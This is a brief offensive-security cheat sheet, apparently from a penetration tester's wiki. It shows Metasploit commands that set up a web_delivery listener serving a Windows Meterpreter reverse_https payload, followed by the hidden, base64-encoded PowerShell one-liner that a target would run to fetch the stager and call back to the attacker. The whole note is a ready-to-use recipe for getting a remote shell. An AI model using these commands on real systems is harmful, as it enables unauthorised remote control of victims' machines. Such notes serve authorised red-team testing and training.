<!-- TITLE: Meterpreterwebdelivery -->
<!-- SUBTITLE: A quick summary of Meterpreterwebdelivery -->

(based on https://github.com/jaredhaight/Invoke-MetasploitPayload)
# Set Up Listener
```use exploit/multi/script/web_delivery
set SRVHOST 192.168.10.113
set SRVPORT 8443
set target 2
set URIPATH met-payload
set payload windows/meterpreter/reverse_https
set LHOST 192.168.10.113
set LPORT 443
run -j

[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAu<REDACTED>QAnACkAKQA7AA==
```